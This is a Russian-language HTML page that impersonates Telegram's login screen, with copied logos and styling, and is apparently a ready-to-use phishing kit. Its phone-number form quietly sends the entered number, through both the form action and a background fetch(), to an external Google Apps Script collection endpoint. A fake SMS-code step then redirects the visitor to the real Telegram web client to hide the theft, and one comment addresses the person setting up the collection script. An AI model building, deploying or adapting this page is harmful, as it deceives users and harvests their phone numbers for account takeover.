<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        :root {
            --tg-theme-bg-color: #ffffff;
            --tg-theme-text-color: #000000;
            --tg-theme-hint-color: #999999;
            --tg-theme-link-color: #267ad5;
            --tg-theme-button-color: #3390ec;
            --tg-theme-button-text-color: #ffffff;
            --tg-theme-secondary-bg-color: #f4f4f5;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }

        .fade-in {
            animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            text-align: center;
            margin-bottom: 25px;
        }

        .logo img {
            width: 100px;
            height: auto;
        }

        h2 {
            text-align: center;
            font-weight: 500;
            font-size: 22px;
            margin-bottom: 10px;
        }

        p.hint {
            text-align: center;
            color: var(--tg-theme-hint-color);
            font-size: 15px;
            line-height: 1.4;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        input[type="tel"], input[type="text"] {
            width: 100%;
            padding: 16px;
            font-size: 17px;
            border: none;
            border-bottom: 1px solid #dfe1e5;
            background: transparent;
            outline: none;
            box-sizing: border-box;
            transition: border-bottom 0.2s;
        }

        input:focus {
            border-bottom: 2px solid var(--tg-theme-link-color);
        }

        input::placeholder {
            color: var(--tg-theme-hint-color);
        }

        .btn {
            width: 100%;
            padding: 16px;
            background-color: var(--tg-theme-button-color);
            color: var(--tg-theme-button-text-color);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn:hover {
            background-color: #2b80db;
        }

        .btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* Скрытые экраны */
        .screen {
            display: none;
        }

        .active {
            display: block;
        }
        
        .code-input {
            text-align: center;
            letter-spacing: 4px;
            font-size: 24px !important;
            padding: 20px !important;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Экран 1: Ввод номера -->
    <div id="step1" class="screen active fade-in">
        <div class="logo">
            <img src="https://telegram.org/img/logo.png" alt="Telegram Logo">
        </div>
        <h2>Ваш телефон</h2>
        <p class="hint">Пожалуйста, укажите ваш код страны и номер телефона.</p>
        
        <!-- ВАЖНО: action указывает на твой скрипт, method="GET" -->
        <form action="https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec" method="GET">
            <div class="input-group">
                <input type="tel" name="phone" placeholder="+79991234567" required autocomplete="off" autofocus>
            </div>
            <button type="submit" class="btn">Далее</button>
        </form>
    </div>

    <!-- Экран 2: Код из SMS -->
    <div id="step2" class="screen fade-in">
        <div class="logo">
            <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" style="width: 80px;">
        </div>
        <h2>Код подтверждения</h2>
        <p class="hint">Мы отправили код в SMS на ваш телефон.</p>
        
        <form onsubmit="window.location.href='https://web.telegram.org/k/'; return false;">
            <div class="input-group">
                <input type="text" class="code-input" placeholder="00000" maxlength="5" required autocomplete="off">
            </div>
            <button type="submit" class="btn">Подтвердить</button>
        </form>
    </div>
</div>

<script>
    // Простой скрипт для переключения экранов без перезагрузки страницы
    const form = document.querySelector('form');
    form.addEventListener('submit', function(e) {
        e.preventDefault(); // Останавливаем стандартную отправку формы
        
        // Переключаем экран
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
        
        // Отправляем данные в фоне через fetch (чтобы страница не перезагружалась сразу)
        const formData = new FormData(form);
        const url = 'https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec?' + new URLSearchParams(formData);
        
        fetch(url).catch(err => console.log("Background send error", err));
        
        // Имитируем задержку как в настоящем ТГ перед появлением кода
        setTimeout(() => {
             // Если нужно, можно добавить еще одну кнопку "Отправить код повторно" и т.д.
        }, 500);
    });
</script>

</body>
</html>
